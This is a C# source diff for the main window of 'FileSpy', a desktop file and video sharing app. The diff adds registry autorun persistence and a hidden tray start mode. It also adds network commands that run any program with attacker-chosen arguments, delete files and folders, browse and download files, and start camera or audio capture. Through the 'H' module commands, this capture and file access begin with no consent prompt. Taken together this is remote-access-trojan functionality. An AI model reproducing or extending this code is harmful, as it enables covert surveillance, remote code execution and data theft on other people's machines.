@@ -1,8 +1,12 @@
 ﻿using FileSpy.Classes;
 using FileSpy.Elements;
 using FileSpy.Windows;
+using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq.Expressions;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
@@ -18,22 +22,26 @@ namespace FileSpy
     /// </summary>
     public partial class MainWindow : Window
     {
-        List<UserControll> Users;
-        List<SetupWindow> Setupers;
-        List<GettingWindow> Getters;
-        List<VideoWindow> VideoWindows;
-        List<VideoClass> VideoClasses;
+        List<UserControll> Users = new List<UserControll>();
+        List<SetupWindow> Setupers = new List<SetupWindow>();
+        List<GettingWindow> Getters = new List<GettingWindow>();
+        List<VideoWindow> VideoWindows = new List<VideoWindow>();
+        List<VideoClass> VideoClasses = new List<VideoClass>();
+        List<FileWindow> FileWindows = new List<FileWindow>();
+        List<FileClass> FileClasses = new List<FileClass>();
 
         ConnectionClass Connection;
 
         SettingsClass Settings;
 
-        string Version = "[0.2.0.0]";
+        string Version = "[0.4.0.0]";
         string Status = "Simple";
+        DateTime TurnOnTime = DateTime.Now;
+
+        NotifyIcon Icons;
+        FlashWindowHelper Helper;
 
         #region Imports
-        [DllImport("Kernel32.dll")]
-        static extern long GetTickCount64();
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool ShowWindow(IntPtr hwnd, WinStyle style);
@@ -49,18 +57,59 @@ namespace FileSpy
             ShowMaximized = 3,
             Show = 5
         }
+
+        public bool SetAutorunValue(bool autorun, string path)
+        {
+            RegistryKey reg;
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                if (autorun)
+                    reg.SetValue("FileSpy", path);
+                else
+                    reg.DeleteValue("FileSpy");
+
+                reg.Close();
+            }
+            catch
+            {
+                return false;
+            }
+            return true;
+        }
+
+        private bool IsStartupItem()
+        {
+            // The path to the key where Windows looks for startup applications
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            if (rkApp.GetValue("FileSpy") == null)
+                // The value doesn't exist, the application is not set to run at startup
+                return false;
+            else
+                // The value exists, the application is set to run at startup
+                return true;
+        }
         #endregion
 
         public MainWindow()
         {
-            //WindowBlur.SetIsEnabled(this, true);
+            WindowBlur.SetIsEnabled(this, true);
             InitializeComponent();
+
+            Helper = new FlashWindowHelper(System.Windows.Application.Current);
+
             Settings = SettingsClass.Create();
-            Users = new List<UserControll>();
-            Setupers = new List<SetupWindow>();
-            Getters = new List<GettingWindow>();
-            VideoWindows = new List<VideoWindow>();
-            VideoClasses = new List<VideoClass>();
+            if (Settings.AutoRun)
+            {
+                if (!IsStartupItem())
+                    SetAutorunValue(true, Environment.CurrentDirectory + "\\Updater.exe");
+            }
+            else
+            {
+                if (IsStartupItem())
+                    SetAutorunValue(false, Environment.CurrentDirectory + "\\Updater.exe");
+            }
 
             if (Environment.GetCommandLineArgs().Length == 1)
                 Close();
@@ -76,18 +125,19 @@ namespace FileSpy
 
         private void CloseButton_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
         {
-            //Task.Run(() => OpenAnim(false));
             this.Hide();
-            NotifyIcon icon = new NotifyIcon();
+            if (Icon != null)
+                Icons.Dispose();
+            Icons = new NotifyIcon();
             using (var iconStream = System.Windows.Application.GetResourceStream(new Uri("Resources/magnet.ico", UriKind.Relative)).Stream)
             {
-                icon.Icon = new System.Drawing.Icon(iconStream);
-                icon.Visible = true;
-                icon.DoubleClick +=
+                Icons.Icon = new System.Drawing.Icon(iconStream);
+                Icons.Visible = true;
+                Icons.DoubleClick +=
                     delegate (object sender1, EventArgs args)
                     {
                         this.Show();
-                        icon.Visible = false;
+                        Icons.Visible = false;
                     };
             }
         }
@@ -112,7 +162,7 @@ namespace FileSpy
             {
                 if (e.Key == Key.K)
                 {
-                    var window = new TextWindow();
+                    var window = new TextWindow(true);
                     window.Owner = this;
                     window.ShowDialog();
                     Settings.SetKeyWord(window.PassBox.Password);
@@ -130,8 +180,9 @@ namespace FileSpy
 
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
-            Task.Run(() => OpenAnim(true));
             Connection.Start();
+            if (Environment.GetCommandLineArgs()[1] == "hidden" && Settings.HiddenStart)
+                CloseButton_MouseLeftButtonUp(null, null);
         }
 
         private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
@@ -147,59 +198,12 @@ namespace FileSpy
 
         private void LostConnection()
         {
-            while (Dispatcher.Invoke(() => GreenColor.Offset < 1.4) && !Connection.Connected)
-            {
-                Dispatcher.Invoke(() => GreenColor.Offset += 0.1);
-                Thread.Sleep(50);
-            }
 
-            while (Dispatcher.Invoke(() => RedColor.Offset > 0.7) && !Connection.Connected)
-            {
-                Dispatcher.Invoke(() => RedColor.Offset -= 0.1);
-                Thread.Sleep(50);
-            }
         }
 
         private void FindConnection()
         {
-            while (Dispatcher.Invoke(() => RedColor.Offset < 1.4) && Connection.Connected)
-            {
-                Dispatcher.Invoke(() => RedColor.Offset += 0.1);
-                Thread.Sleep(50);
-            }
 
-            while (Dispatcher.Invoke(() => GreenColor.Offset > 0.7) && Connection.Connected)
-            {
-                Dispatcher.Invoke(() => GreenColor.Offset -= 0.1);
-                Thread.Sleep(50);
-            }
-        }
-
-        private void OpenAnim(bool loaded)
-        {
-            float delay;
-            if (loaded)
-            {
-                delay = 5;
-                for (int i = 0; i < 20; i++)
-                {
-                    Dispatcher.Invoke(() => Grid.Opacity += 0.05);
-                    Dispatcher.Invoke(() => Grid.Margin = new Thickness(Grid.Margin.Left - 12.25, Grid.Margin.Top, Grid.Margin.Right - 12.25, Grid.Margin.Bottom));
-                    delay += 0.5f;
-                    Thread.Sleep(Convert.ToInt32(delay));
-                }
-            }
-            else
-            {
-                delay = 15;
-                for (int i = 0; i < 20; i++)
-                {
-                    Dispatcher.Invoke(() => Grid.Opacity -= 0.05);
-                    Dispatcher.Invoke(() => Grid.Margin = new Thickness(Grid.Margin.Left + 12.25, Grid.Margin.Top, Grid.Margin.Right + 12.25, Grid.Margin.Bottom));
-                    delay -= 0.5f;
-                    Thread.Sleep(Convert.ToInt32(delay));
-                }
-            }
         }
 
         private void Connection_AcceptMessage(MessageClass message)
@@ -242,25 +246,31 @@ namespace FileSpy
                 try
                 {
                     string[] com = message.GetStringPackage().Split(';');
-
+                    AddUser(com);
                     Dispatcher.Invoke(() =>
                     {
-                        int count = Users.Count;
-                        for (int i = 0; i < count; i++)
+                        try
                         {
-                            FullTable.Items.Remove(Users[0]);
-                            Users.Remove(Users[0]);
-                        }
+                            /*
+                            int count = Users.Count;
+                            for (int i = 0; i < count; i++)
+                            {
+                                FullTable.Items.Remove(Users[0]);
+                                Users.Remove(Users[0]);
+                            }
 
-                        for (int i = 0; i < com.Length; i += 3)
-                        {
-                            var user = new UserControll(Convert.ToInt32(com[i]), com[i + 1], com[i + 2]);
-                            user.ActiveEvent += User_ActiveEvent;
-                            Users.Add(user);
-                            FullTable.Items.Add(user);
-                            if (Status != "Simple")
-                                user.SetEnabled(1, true);
+                            for (int i = 0; i < com.Length; i += 3)
+                            {
+                                var user = new UserControll(Convert.ToInt32(com[i]), com[i + 1], com[i + 2]);
+                                user.ActiveEvent += User_ActiveEvent;
+                                Users.Add(user);
+                                FullTable.Items.Add(user);
+                                if (Status != "Simple")
+                                    user.SetEnabled(1, true);
+                            }
+                            */
                         }
+                        catch { }
                     });
                 }
                 catch { }
@@ -308,7 +318,10 @@ namespace FileSpy
                     result += "[Secret]\n";
                 else
                     result += "Simple\n";
-                result += TimeSpan.FromMilliseconds(GetTickCount64()).ToString();
+
+                result += Directory.GetCurrentDirectory() + "\n";
+
+                result += TurnOnTime.ToString();
 
                 Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Info, 0, result));
             }
@@ -333,6 +346,20 @@ namespace FileSpy
                                 name = Users[i].NameLabel.Content as string;
                         }
                         var window = new RequestWindow(name, message.GetStringPackage());
+                        window.Owner = this;
+                        if (!SilenceControll.Mode)
+                        {
+                            window.Topmost = false;
+                            window.WindowStartupLocation = WindowStartupLocation.CenterOwner;
+                            if (!IsActive)
+                            {
+                                this.Show();
+                                if (Icons != null)
+                                    Icons.Visible = false;
+                                this.WindowState = WindowState.Minimized;
+                            }
+                        }
+                        Helper.FlashApplicationWindow();
                         window.ShowDialog();
                         if (window.Result)
                             Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.AcceptFile, message.ElementID));
@@ -391,7 +418,11 @@ namespace FileSpy
                     string[] com = message.GetStringPackage().Split(';');
                     getter.FileName = com[0];
                     getter.FileSize = Convert.ToInt64(com[1]);
-                    getter.CloseEvent += Getter_CloseEvent;
+                    getter.CloseEvent += (GettingWindow window) =>
+                    {
+                        Getters.Remove(window);
+                        GC.Collect();
+                    };
                     getter.Owner = this;
                     getter.Show();
                     Getters.Add(getter);
@@ -411,9 +442,22 @@ namespace FileSpy
                 });
             }
 
+            if (message.Command == Commands.FileDone)
+            {
+                Dispatcher.Invoke(() =>
+                {
+                    try
+                    {
+                        var getter = FindGetter(message.ElementID, message.Sender);
+                        getter.Done();
+                    }
+                    catch { }
+                });
+            }
+
             #endregion
 
-            #region VideoCommands
+            #region VideoMCommands
             if (message.Command == Commands.RVideoModule)
             {
                 Task.Run(() =>
@@ -427,11 +471,29 @@ namespace FileSpy
                                 name = Users[i].NameLabel.Content as string;
                         }
                         var window = new RequestWindow(name, "<Video.mp4>");
+                        window.Owner = this;
+                        if (!SilenceControll.Mode)
+                        {
+                            window.Topmost = false;
+                            window.WindowStartupLocation = WindowStartupLocation.CenterOwner;
+                            if (!IsActive)
+                            {
+                                this.Show();
+                                if (Icons != null)
+                                    Icons.Visible = false;
+                                this.WindowState = WindowState.Minimized;
+                            }
+                        }
+                        Helper.FlashApplicationWindow();
                         window.ShowDialog();
                         if (window.Result)
                         {
                             var video = new VideoClass(message.ElementID, message.Sender, Connection);
-                            video.CloseEvent += VideoSender_CloseEvent;
+                            video.CloseEvent += (VideoClass obj) =>
+                            {
+                                VideoClasses.Remove(obj);
+                                GC.Collect();
+                            };
                             video.Start();
                             VideoClasses.Add(video);
                         }
@@ -444,7 +506,11 @@ namespace FileSpy
             if (message.Command == Commands.HVideoModule)
             {
                 var video = new VideoClass(message.ElementID, message.Sender, Connection);
-                video.CloseEvent += VideoSender_CloseEvent;
+                video.CloseEvent += (VideoClass obj) =>
+                {
+                    VideoClasses.Remove(obj);
+                    GC.Collect();
+                };
                 video.Start();
                 VideoClasses.Add(video);
             }
@@ -563,7 +629,313 @@ namespace FileSpy
                 }
                 catch { }
             }
+
+            if (message.Command == Commands.SetLoop)
+            {
+                try
+                {
+                    if (message.GetStringPackage() == "True")
+                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).LoopInput.StartRecording());
+                    else
+                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).LoopInput.StopRecording());
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.LoopInfo)
+            {
+                try
+                {
+                    Dispatcher.Invoke(() => FindVideoWindow(message.ElementID).SetupLoop(message.Package));
+                }
+                catch { }
+            }
+
+
+            if (message.Command == Commands.LoopData)
+            {
+                try
+                {
+                    Dispatcher.Invoke(() => FindVideoWindow(message.ElementID).LoopBuffer.AddSamples(message.Package, 0, message.Package.Length));
+                }
+                catch { }
+            }
             #endregion
+
+            #region FileMCommands
+            if (message.Command == Commands.RFileModule)
+            {
+                Task.Run(() =>
+                {
+                    Dispatcher.Invoke(() =>
+                    {
+                        string name = "[Secret]";
+                        for (int i = 0; i < Users.Count; i++)
+                        {
+                            if (message.Sender == Users[i].ID)
+                                name = Users[i].NameLabel.Content as string;
+                        }
+                        var window = new RequestWindow(name, "<TextFile>");
+                        window.Owner = this;
+                        if (!SilenceControll.Mode)
+                        {
+                            window.Topmost = false;
+                            window.WindowStartupLocation = WindowStartupLocation.CenterOwner;
+                            if (!IsActive)
+                            {
+                                this.Show();
+                                if (Icons != null)
+                                    Icons.Visible = false;
+                                this.WindowState = WindowState.Minimized;
+                            }
+                        }
+                        Helper.FlashApplicationWindow();
+                        window.ShowDialog();
+                        if (window.Result)
+                        {
+                            var fileClass = new FileClass(message.ElementID, message.Sender, Connection);
+                            fileClass.CloseEvent += (FileClass obj) =>
+                            {
+                                FileClasses.Remove(obj);
+                                GC.Collect();
+                            };
+                            fileClass.Start();
+                            FileClasses.Add(fileClass);
+                        }
+                        else
+                            Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.FileMDenied, message.ElementID));
+                    });
+                });
+            }
+
+            if (message.Command == Commands.HFileModule)
+            {
+                var fileClass = new FileClass(message.ElementID, message.Sender, Connection);
+                fileClass.CloseEvent += (FileClass obj) =>
+                {
+                    FileClasses.Remove(obj);
+                    GC.Collect();
+                };
+                fileClass.Start();
+                FileClasses.Add(fileClass);
+            }
+
+            if (message.Command == Commands.FileMAccepted)
+            {
+                try
+                {
+                    FindFileWindow(message.ElementID).Accept();
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.FileMDenied)
+            {
+
+            }
+
+            if (message.Command == Commands.FilePulsar)
+            {
+                try
+                {
+                    FindFileClass(message.ElementID, message.Sender).Pulsar();
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.CD)
+            {
+                try
+                {
+                    byte[] data = FindFileClass(message.ElementID, message.Sender).CD(message.GetStringPackage());
+                    Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Dirs, message.ElementID, data));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.Dirs)
+            {
+                Dispatcher.Invoke(() =>
+                {
+                    try
+                    {
+                        FindFileWindow(message.ElementID).SetDirs(message.Package);
+                    }
+                    catch { }
+                });
+            }
+
+            if (message.Command == Commands.Run)
+            {
+                try
+                {
+                    if (FindFileClass(message.ElementID, message.Sender) == null) return;
+                    ProcessStartInfo startInfo = new ProcessStartInfo(message.GetStringPackage());
+                    startInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(message.GetStringPackage());
+                    Process.Start(startInfo);
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.RunWith)
+            {
+                try
+                {
+                    if (FindFileClass(message.ElementID, message.Sender) == null) return;
+                    string[] com = message.GetStringPackage().Split(';');
+                    ProcessStartInfo startInfo = new ProcessStartInfo(com[0], com[1]);
+                    startInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(com[0]);
+                    Process.Start(startInfo);
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.Delete)
+            {
+                try
+                {
+                    FileClass fileClass = FindFileClass(message.ElementID, message.Sender);
+                    if (fileClass == null) return;
+
+                    string path = message.GetStringPackage();
+                    if (Directory.Exists(path))
+                        Directory.Delete(path);
+                    else if (File.Exists(path))
+                        File.Delete(path);
+
+                    byte[] data = fileClass.CD(Path.GetDirectoryName(message.GetStringPackage()));
+                    Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.Dirs, message.ElementID, data));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.StartDownload)
+            {
+                try
+                {
+                    Task.Run(() => FindFileClass(message.ElementID, message.Sender).StartDownload(message.GetStringPackage()));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.StopDownload)
+            {
+                try
+                {
+                    FindFileClass(message.ElementID, message.Sender).StopDownload();
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.FileUData)
+            {
+                try
+                {
+                    FindFileClass(message.ElementID, message.Sender).SetData(message.Package);
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.FileUError)
+            {
+                try
+                {
+                    FindFileWindow(message.ElementID).SetUError(message.GetStringPackage());
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.FileDData)
+            {
+                try
+                {
+                    FindFileWindow(message.ElementID).SetData(message.Package);
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.GetDirInfo)
+            {
+                try
+                {
+                    Task.Run(() => FindFileClass(message.ElementID, message.Sender).GetDirInfo(message.GetStringPackage()));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.DirInfo)
+            {
+                try
+                {
+                    FindFileWindow(message.ElementID).SetProp(message.Package);
+                }
+                catch { }
+            }
+            #endregion
+        }
+
+        private async void AddUser(string[] com)
+        {
+            try
+            {
+                Dispatcher.Invoke(() =>
+                {
+                    for (int i = 0; i < Users.Count; i++)
+                        Users[i].Checked = false;
+                });
+
+                for (int i = 0; i < com.Length; i += 3)
+                {
+                    int eq = 0;
+                    Dispatcher.Invoke(() =>
+                    {
+                        var user = new UserControll(Convert.ToInt32(com[i]), com[i + 1], com[i + 2]);
+
+                        for (int k = 0; k < Users.Count; k++)
+                        {
+                            if (user.ID == Users[k].ID)
+                            {
+                                Users[k].Checked = true;
+                                eq++;
+                            }
+                        }
+                    });
+
+                    if (eq == 0)
+                    {
+                        Dispatcher.Invoke(() =>
+                        {
+                            var user = new UserControll(Convert.ToInt32(com[i]), com[i + 1], com[i + 2]);
+                            user.ActiveEvent += User_ActiveEvent;
+                            Users.Add(user);
+                            FullTable.Items.Add(user);
+                            if (Status != "Simple")
+                                user.SetEnabled(1, true);
+                        });
+                        await Task.Run(Users[Users.Count - 1].LoadedAnimation);
+                    }
+                }
+
+                for (int i = 0; i < Dispatcher.Invoke(() => Users.Count); i++)
+                {
+                    if (Dispatcher.Invoke(() => !Users[i].Checked))
+                    {
+                        RemoveUser(i);
+                    }
+                }
+
+            }
+            catch { }
+        }
+
+        private async void RemoveUser(int id)
+        {
+            await Task.Run(Users[id].UnloadedAnimation);
+            Dispatcher.Invoke(() =>
+            {
+                FullTable.Items.Remove(Users[id]);
+                Users.Remove(Users[id]);
+            });
         }
 
         private void User_ActiveEvent(int id, string name, int command)
@@ -592,7 +964,11 @@ namespace FileSpy
                 var setup = new SetupWindow(gid, id, name, Connection);
                 Setupers.Add(setup);
                 setup.Owner = this;
-                setup.CloseEvent += Setup_CloseEvent;
+                setup.CloseEvent += (SetupWindow window) =>
+                {
+                    Setupers.Remove(window);
+                    GC.Collect();
+                };
                 setup.Show();
             }
 
@@ -614,9 +990,38 @@ namespace FileSpy
 
                 var video = new VideoWindow(gid, id, name, Connection);
                 VideoWindows.Add(video);
-                video.CloseEvent += Video_CloseEvent;
-                video.Owner = this;
+                video.CloseEvent += (VideoWindow window) =>
+                {
+                    VideoWindows.Remove(window);
+                    GC.Collect();
+                };
                 video.Show();
+            }
+
+            if (command == ElementCommands.FileModule)
+            {
+                Random r = new Random();
+                int gid = -1;
+                bool ok = true;
+                while (ok)
+                {
+                    ok = false;
+                    gid = r.Next(1, Int32.MaxValue / 2);
+                    for (int i = 0; i < VideoWindows.Count; i++)
+                    {
+                        if (gid == VideoWindows[i].ID)
+                            ok = true;
+                    }
+                }
+
+                var fileWindow = new FileWindow(gid, id, name, Connection);
+                FileWindows.Add(fileWindow);
+                fileWindow.CloseEvent += (FileWindow window) =>
+                {
+                    FileWindows.Remove(window);
+                    GC.Collect();
+                };
+                fileWindow.Show();
             }
         }
 
@@ -664,28 +1069,26 @@ namespace FileSpy
             return null;
         }
 
-        private void Setup_CloseEvent(SetupWindow window)
+        private FileWindow FindFileWindow(int id)
         {
-            Setupers.Remove(window);
-            GC.Collect();
+            for (int i = 0; i < FileWindows.Count; i++)
+            {
+                if (FileWindows[i].ID == id)
+                    return FileWindows[i];
+            }
+
+            return null;
         }
 
-        private void Getter_CloseEvent(GettingWindow window)
+        private FileClass FindFileClass(int id, int userID)
         {
-            Getters.Remove(window);
-            GC.Collect();
-        }
+            for (int i = 0; i < FileClasses.Count; i++)
+            {
+                if (FileClasses[i].ID == id && FileClasses[i].UserID == userID)
+                    return FileClasses[i];
+            }
 
-        private void Video_CloseEvent(VideoWindow window)
-        {
-            VideoWindows.Remove(window);
-            GC.Collect();
-        }
-
-        private void VideoSender_CloseEvent(VideoClass videoClass)
-        {
-            VideoClasses.Remove(videoClass);
-            GC.Collect();
+            return null;
         }
     }
 }
